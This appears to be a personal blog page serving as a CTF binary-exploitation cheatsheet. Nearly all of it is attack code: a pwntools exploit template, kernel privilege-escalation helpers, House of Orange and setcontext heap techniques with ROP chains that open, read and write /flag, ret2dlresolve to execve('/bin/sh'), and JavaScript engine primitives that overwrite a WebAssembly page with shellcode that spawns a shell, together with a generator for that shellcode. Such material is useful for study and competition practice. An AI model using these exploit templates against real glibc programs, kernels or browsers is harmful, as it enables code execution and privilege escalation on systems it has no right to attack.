---
layout: page
title: cheatsheet
permalink: /cheatsheet/
---

# PwntoolsExp
```sh
echo "from pwn import *" > exp.py
echo "context.log_level='debug'" >> exp.py
echo "context.arch='amd64'" >> exp.py
echo "#context.terminal=['tmux','split','-h']" >> exp.py
echo "p=process('./pwn')" >> exp.py
echo "ra 		= lambda a: 	p.readuntil(a)">> exp.py
echo "r			= lambda n:		p.read(n)">> exp.py
echo "sla 		= lambda a,b: 	p.sendlineafter(a,b)">> exp.py
echo "sa 		= lambda a,b: 	p.sendafter(a,b)">> exp.py
echo "sl		= lambda a: 	p.sendline(a)">> exp.py
echo "s			= lambda a: 	p.send(a)">> exp.py
echo "leak		= lambda a:		u64(p.read(6)+b'\0\0')-a">> exp.py
echo "gdb.attach(p)">> exp.py
echo "p.interactive()">> exp.py
```
# Kernel
```c
//gcc ./fs/exp.c -masm=intel --static -o ./fs/exp
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdint.h>
void shell(){
    if(!getuid())
    {
        system("/bin/sh");
    }
    else{
        puts("[!] NO ROOT");
    }
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}
uint64_t u64(uint8_t *buf)
{
    uint64_t res = 0;
    for(int i =0 ; i < 8;i++)
    {
        res = res<<8;
        res+=(uint)buf[7-i];
    }
    return res;
}
void panic(char *s)
{
    printf("[!] Panic:");
    puts(s);
    exit(1);
}
/*
--------------------------
Back to the User Space <!>
Instruction:
swapgs; iretq
--------------------------
Stack : 
...
rpi
user_cs
user_rflags
user_sp
user_ss
*/
```
# House of Orange
```python
fio=0#fake io_file addr
fake = "/bin/sh\x00"+p64(0x61)+p64(libc.symbols['system'])+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
fake = fake.ljust(0xa0,'\x00')+p64(fio+0x8)
fake = fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(libc.symbols['system'])
```
# Setcontext(RDI)
```python
#Setcontext Module Start>>>> 
libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
libc.address=base

rop = ROP(libc)
sys = rop.find_gadget(['pop rdx','ret'])[0]

# Please set rsp == Free's first Parameter (if you are gonna to hijack free_hook)
rsp=heap+0x10

rdi=0
rsi=rsp
rdx=0x100
rbp=rsi-8
rcx=sys
payload=payload.ljust(0x68,b'\0')+flat([rdi,rsi,rbp,0,rdx,0,0,rsp,rcx])

edit(2,payload)
free(2)

rop.read(3,heap,0x100)
rop.write(1,heap,0x100)
rop.dump()
p2 =rop.chain()

syscall=0xcf6c5+base
rax = rop.find_gadget(['pop rax','ret'])[0]
rdi = rop.find_gadget(['pop rdi','ret'])[0]
rsi = rop.find_gadget(['pop rsi','ret'])[0]
rdx = rop.find_gadget(['pop rdx','ret'])[0]
p1 =flat([rax,0x2,rdi,heap+0x110,rsi,0,rdx,0,sys)

pay=p1+p2
p.send(pay.ljust(0x100,b'\0')+b'/flag\0')
#Setcontext Module END>>>> 
```
# Setcontext(RDX)
`getkeyserv_handle+576`
`searchmem 0x2404894808578b48`

```python
#Setcontext Module Start>>>> 
#++++++++++++++++++++++++++++++
# Before starting this module, I 
# hope you have set free_hook
# ==> magic gadget 0x2404894808578b48
chunk=heap+0x10
# chunk is Free's first Parameter
#+++++++++++++++++++++++++++++++
payload=p64(0)+p64(chunk)+b'\0'*0x10+p64(0x55e35+base)
libc=ELF("/lib/x86_64-linux-gnu/libc-2.29.so")
libc.address=base
rop = ROP(libc)
sys = rop.find_gadget(['syscall','ret'])[0]
rsp=chunk
rdi=0
rsi=rsp
rdx=0x110
rbp=rsi-8
rcx=sys
payload=payload.ljust(0x68,b'\0')+flat([rdi,rsi,rbp,0,rdx,0,0,rsp,rcx])
edit(2,payload)
gdb.attach(p,'b free')
free(2)

rop.read(3,chunk+0x110,0x100)
rop.write(1,chunk+0x110,0x100)
rop.dump()
pyaload_rw =rop.chain()

rax = rop.find_gadget(['pop rax','ret'])[0]
rdi = rop.find_gadget(['pop rdi','ret'])[0]
rsi = rop.find_gadget(['pop rsi','ret'])[0]
rdx = rop.find_gadget(['pop rdx','ret'])[0]
pyaload_open =flat([rax,0x2,rdi,chunk+0xf8,rsi,0,rdx,0,sys])
pay = pyaload_open+pyaload_rw
p.send(pay.ljust(0xf8,b'\0')+b'/flag\0')
#Setcontext Module END>>>> 
```

# OffByOne Shrinke
```python
add(0x400)#0
add(0x88)#1
add(0x18)#2
free(0)
add(0x18)#0
edit(0x18,"A"*0x18)
add(0x88)#3
add(0x88)#4
free(3)
free(1)
```
# _dl_runtime_resolve
```python
rop = ROP("./pwn")
elf = ELF("./pwn")
#dl = Ret2dlresolvePayload(elf,symbol='system',args=["/bin/sh"])
dl = Ret2dlresolvePayload(elf,symbol='execve',args=["/bin/sh",0,0])
rop.read(0,dl.data_addr)
rop.ret2dlresolve(dl)
#print(rop.dump())
p.send("\0"*pad+str(rop))
raw_input()
p.send(dl.payload)
```

# retf
```python
to32='\xC7\x44\x24\x04\x23\x00\x00\x00\xCB'
to64='\xC7\x44\x24\x04\x33\x00\x00\x00\xCB'
# to32:                           ;;将CPU模式转换为32位
#     mov DWORD [rsp+4],0x23      ;;32位
#     retf
# to64:                           ;;将CPU模式转换为64位
#     mov DWORD [esp+4],0x33      ;;64位
#     retf
```

# orw
```python
rop = ROP(libc)
rop.read(3,chunk+0x110,0x100)
rop.write(1,chunk+0x110,0x100)
rop.dump()
pyaload_rw =rop.chain()

sys = rop.find_gadget(['syscall','ret'])[0]
rax = rop.find_gadget(['pop rax','ret'])[0]
rdi = rop.find_gadget(['pop rdi','ret'])[0]
rsi = rop.find_gadget(['pop rsi','ret'])[0]
rdx = rop.find_gadget(['pop rdx','ret'])[0]
pyaload_open =flat([rax,0x2,rdi,chunk+0xf8,rsi,0,rdx,0,sys])
pay = pyaload_open+pyaload_rw
```

# JavaScript
```js
var _b = new ArrayBuffer(16);
var _f = new Float64Array(_b);
var _i = new BigUint64Array(_b);
function f2i(f)
{
	_f[0] = f;
	return _i[0];
}
function i2f(i)
{
	_i[0] = i;
	return _f[0];
}
function hex(i)
{
	return "0x"+i.toString(16).padStart(16,"0");
}
```

# Trigger to __free_hook
```js
function get_shell()
{
    let get_shell_buffer = new ArrayBuffer(0x1000);
    let get_shell_dataview = new DataView(get_shell_buffer);
    get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn));
}
get_shell();
```
# Wasm Instance
```javascript
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f= wasmInstance.exports.main;
var shell = [0xf631483bb0c03148n, 0x69622fbf48d23148n, 0x8948570068732f6en,0x50fe7n];
var tmp = aar(addressOf(f)+0x18n)-1n;
tmp = aar(tmp+8n)-1n;
tmp = aar(tmp+0x10n)-1n
tmp = aar(tmp+0x88n)
var buf =new ArrayBuffer(shell.length*8);
aaw(addressOf(buf)+0x20n,tmp);
var v =new DataView(buf);
for(let i=0;i<shell.length;i++){
	v.setFloat64(i*8,i2f(shell[i]),true);
}
f();
```
# Wasm shellcode genrator
```python
import copy
from pwn import *
context.arch='amd64'
sh='''
xor rax,rax
mov al,59
xor rsi,rsi
xor rdx,rdx
{}
mov rdi,rsp
syscall
'''
def convert2js(s):
	res=[]
	s= s.ljust((len(s)//8+1)*8,'\0')
	for x in range(len(s)//8):
		res.append(u64(s[x*8:x*8+8]))
	return res
def command(s):
	res=[]
	if(len(s)%8!=0):
		s= s.ljust((len(s)//8+1)*8,'\0')
	for x in range(len(s)//8):
		res.append(u64(s[x*8:x*8+8]))
	return res
def run():
	tmp = command("/bin/sh")
	s ="""
mov rdi,{}
push rdi
	"""
	res=''
	l= len(tmp)
	for x in range(l):
		xx = s.format(hex(tmp[l-1-x]))
		res+=sh.format(xx)
	#print(res)
	t=asm(res)
	a=convert2js(t)
	final = "var shell = ["
	for x in a:
		final +=" {}n,".format(hex(x))
	return final+"];"
	
print run()
```